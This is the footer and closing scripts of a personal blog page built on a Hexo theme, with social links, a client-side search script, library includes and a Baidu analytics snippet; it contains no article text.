                    </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://t.me/MiaoTonyChannel" class="tooltipped" target="_blank" data-tooltip="关注我的TelegramChannel: @MiaoTonyChannel" data-position="top" data-delay="50">
        <i class="fab fa-telegram"></i>
    </a>



    <a href="https://github.com/miaotony" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:miaotony@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    var cnt = 1;
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var content_index = [];
                        var data_title_origin = data.title.trim();
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + String(cnt) + ". " + data_title_origin + "</a>";
                            cnt += 1;
    
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 300 characters
                                var start = first_occur - 30;
                                if (start < 0) {
                                    start = 0;
                                }
                                var match_content = content.substr(start, 300);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });
    
                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    str = "<p class=\"search-result-summary\">共找到 " + String(cnt-1) + " 条结果</p>"  + str;
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.min.js"></script>

    

    
<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?40e312a1eec109cf96e30988cf3bfe70";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
